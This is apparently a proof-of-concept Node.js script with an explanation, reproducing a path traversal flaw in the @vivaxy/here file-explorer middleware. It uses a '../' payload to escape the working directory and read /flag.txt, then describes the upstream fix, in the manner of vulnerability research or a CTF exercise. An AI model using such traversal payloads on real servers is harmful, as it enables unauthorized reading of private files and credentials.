const path = require('path');
const fs = require('fs').promises;

async function exploit() {
  // Simulate the working directory that @vivaxy/here uses as its root
  const baseDirectory = process.cwd();

  // Deep traversal payload to escape the working directory and target /flag.txt
  const traversalPayload = '../../../../../../../../../flag.txt';

  // Replicate the exact vulnerable path resolution logic from middleware/file-explorer.js:
  // `const fullRequestPath = path.join(directory, requestPath);`
  const resolvedPath = path.join(baseDirectory, traversalPayload);

  console.log('[*] @vivaxy/here Path Traversal PoC');
  console.log(`    Base Directory : ${baseDirectory}`);
  console.log(`    Attack Payload : ${traversalPayload}`);
  console.log(`    Resolved Path  : ${resolvedPath}\n`);

  // Demonstrate the missing security control in the original middleware
  if (!resolvedPath.startsWith(baseDirectory)) {
    console.log('[!] Vulnerability Confirmed: path.join() resolves outside the intended working directory without restriction.');
  }

  // Directly access the file using the traversed path to prove arbitrary file read capability.
  // Exceptions are intentionally allowed to propagate as per instructions so failures are visible.
  const content = await fs.readFile(resolvedPath, 'utf8');
  console.log('[+] Successfully read /flag.txt via directory traversal bypass.');
  console.log(content);
}

await exploit();
```

### Why This Demonstrates the Vulnerability:
1. **Core Flaw**: The vulnerable version of `middleware/file-explorer.js` concatenates user-controlled input (`requestPath`) with a base directory using `path.join()`. In Node.js, `path.join()` does not automatically restrict traversal; it simply resolves `..` sequences relative to the provided paths.
2. **Bypass Mechanism**: By supplying a payload like `'../../../../../../../../../flag.txt'`, the attacker forces `path.join(baseDirectory, payload)` to resolve to a path entirely outside the intended serving directory (e.g., `/flag.txt`). 
3. **Missing Validation**: The original code blindly trusts the resolved path and passes it to `fs.stat` / `fs.readFile`. It lacks a safety check to ensure the final normalized path still falls within the allowed root directory. The commit message `"Fix an issue that users can browse outside the wd"` directly references this exact missing validation step.
4. **Impact Proof**: The PoC explicitly verifies the escape condition (`!resolvedPath.startsWith(baseDirectory)`) and then attempts to read the target file using the escaped path. This proves that an attacker can bypass directory isolation and achieve arbitrary local file read (ALFR), escalating the vulnerability from a mere routing issue to a data exfiltration risk. The fix in the repository correctly adds `if (!fullRequestPath.startsWith(directory)) return next;` to enforce path confinement before any filesystem operations occur.

